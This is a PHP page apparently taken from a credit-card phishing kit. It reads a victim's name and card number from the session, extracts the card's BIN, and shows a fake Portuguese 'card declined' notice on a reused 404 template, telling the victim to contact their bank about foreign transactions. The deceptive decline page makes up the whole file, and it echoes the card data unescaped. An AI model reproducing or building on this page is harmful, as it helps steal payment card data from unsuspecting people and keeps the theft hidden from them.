<?php 

session_start();

$titular = $_SESSION['titular'];
$creditcard = $_SESSION['creditcard'];

$bin = substr($creditcard, 0,6);

if (empty($titular)) {
	header("location: ../");
	session_destroy();
}

elseif (empty($creditcard)) {
	header("location: ../");
	session_destroy();
}



 ?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>404 HTML Tempalte by Colorlib</title>

	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,900" rel="stylesheet">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->

</head>

<body>

	<div id="notfound">
		<div class="notfound">
			<div class="notfound-404">
				<h1>Error!</h1>
			</div>
			<h2>101 - Seu cartão foi recusado</h2>
			<p>Entre em contato com seu banco para permitir transações de fora do pais</p>
			<small>Titular da compra: <?php echo "$titular"; ?></small><br>
			<small>Cartão com inicio: <?php echo "$creditcard"; ?></small><br>
			<small>Valor a ser debitado: R$ 0,00</small><br><br>
			<a href="../">Voltar</a>
		</div>
	</div>

</body><!-- This templates was made by Colorlib (https://colorlib.com) -->

</html>
